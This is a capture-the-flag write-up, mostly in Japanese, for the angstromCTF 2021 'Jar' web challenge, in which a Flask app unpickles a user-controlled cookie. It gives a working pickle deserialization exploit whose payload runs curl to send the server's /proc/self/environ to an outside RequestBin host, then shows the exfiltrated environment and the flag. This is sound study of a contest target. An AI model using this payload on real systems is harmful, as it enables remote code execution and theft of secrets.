# Jar:Web:70pts
My other pickle challenges seem to be giving you all a hard time, so here's a [simpler one](https://jar.2021.chall.actf.co/) to get you warmed up.  
[jar.py](jar.py), [pickle.jpg](pickle.jpg), [Dockerfile](Dockerfile)  
Hint  
The Python [documentation](https://docs.python.org/3/library/pickle.html) for pickle has this big red box... I hope it's not important.  

# Solution
アクセスすると、ピクルスにtextを漬けられるサイトのようだ。  
site  
[site1.png](site/site1.png)  
配布されたjar.pyを見ると以下のようであった。  
```python
~~~
@app.route('/')
def jar():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
	return '<form method="post" action="/add" style="text-align: center; width: 100%"><input type="text" name="item" placeholder="Item"><button>Add Item</button><img style="width: 100%; height: 100%" src="/pickle.jpg">' + \
		''.join(f'<div style="background-color: white; font-size: 3em; position: absolute; top: {random.random()*100}%; left: {random.random()*100}%;">{item}</div>' for item in items)

@app.route('/add', methods=['POST'])
def add():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
	items.append(request.form['item'])
	response = make_response(redirect('/'))
	response.set_cookie('contents', base64.b64encode(pickle.dumps(items)))
	return response
~~~
```
cookie経由でデータをやり取りし、pickleを用いているようだ。  
コードをシリアライズしたものを渡してやれば実行できることが知られている。  
flagの場所が不明だが配布されたDockerfileに`ENV FLAG="actf{REDACTED}"`の記述がある。  
つまり`/proc/self/environ`に書かれている。  
以下のyumm.pyでcurlを用い、外部にファイルの中身を送信してやるcookieを作成する。  
```python:yumm.py
import base64
import pickle

class rce():
    def __reduce__(self):
        return (eval, ("os.system('curl https://enbgdei302k4o.x.pipedream.net/ -d \"$(cat /proc/self/environ | base64)\"')",))
        # https://enbgdei302k4o.x.pipedream.net/ <- RequestBin.com

code = pickle.dumps(rce())
print(base64.b64encode(code))
```
実行して得られたcookieを設定し、リクエストを飛ばす。  
```bash
$ python3 yumm.py
b'gASVfAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxgb3Muc3lzdGVtKCdjdXJsIGh0dHBzOi8vZW5iZ2RlaTMwMms0by54LnBpcGVkcmVhbS5uZXQvIC1kICIkKGNhdCAvcHJvYy9zZWxmL2Vudmlyb24gfCBiYXNlNjQpIicplIWUUpQu'
$ curl https://jar.2021.chall.actf.co/ --cookie "contents=gASVfAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxgb3Muc3lzdGVtKCdjdXJsIGh0dHBzOi8vZW5iZ2RlaTMwMms0by54LnBpcGVkcmVhbS5uZXQvIC1kICIkKGNhdCAvcHJvYy9zZWxmL2Vudmlyb24gfCBiYXNlNjQpIicplIWUUpQu"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```
受付側サーバで以下のようなデータを得られた。  
```
VklSVFVBTF9IT1NUPWphci4yMDIxLmNoYWxsLmFjdGYuY28ASE9TVE5BTUU9MDI0MzQ3YWYzMGJl
AFBZVEhPTl9QSVBfVkVSU0lPTj0yMS4wLjEASE9NRT0vbm9uZXhpc3RlbnQAR1BHX0tFWT1FM0ZG
MjgzOUMwNDhCMjVDMDg0REVCRTlCMjY5OTVFMzEwMjUwNTY4AFBZVEhPTl9HRVRfUElQX1VSTD1o
dHRwczovL2dpdGh1Yi5jb20vcHlwYS9nZXQtcGlwL3Jhdy8yOWYzN2RiZTZiMzg0MmNjZDUyZDYx
ODE2YTMwNDQxNzM5NjJlYmViL3B1YmxpYy9nZXQtcGlwLnB5AFBBVEg9L3Vzci9sb2NhbC9iaW46
L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3Ivc2JpbjovdXNyL2Jpbjovc2Jpbjov
YmluAExBTkc9Qy5VVEYtOABQWVRIT05fVkVSU0lPTj0zLjkuMwBQV0Q9L3NydgBQWVRIT05fR0VU
X1BJUF9TSEEyNTY9ZTAzZWI4YTMzZDNiNDQxZmY0ODRjNTZhNDM2ZmYxMDY4MDQ3OWQ0YmQxNGU1
OTI2OGU2Nzk3N2VkNDA5MDRkZQBGTEFHPWFjdGZ7eW91X2dvdF95b3Vyc2VsZl9vdXRfb2ZfYV9w
aWNrbGV9AA==
```
base64デコードすると元データが得られる。
```
VIRTUAL_HOST=jar.2021.chall.actf.co.HOSTNAME=024347af30be.PYTHON_PIP_VERSION=21.0.1.HOME=/nonexistent.GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568.PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/29f37dbe6b3842ccd52d61816a3044173962ebeb/public/get-pip.py.PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin.LANG=C.UTF-8.PYTHON_VERSION=3.9.3.PWD=/srv.PYTHON_GET_PIP_SHA256=e03eb8a33d3b441ff484c56a436ff10680479d4bd14e59268e67977ed40904de.FLAG=actf{you_got_yourself_out_of_a_pickle}.
```
案の定flagが入っていた。  

## actf{you_got_yourself_out_of_a_pickle}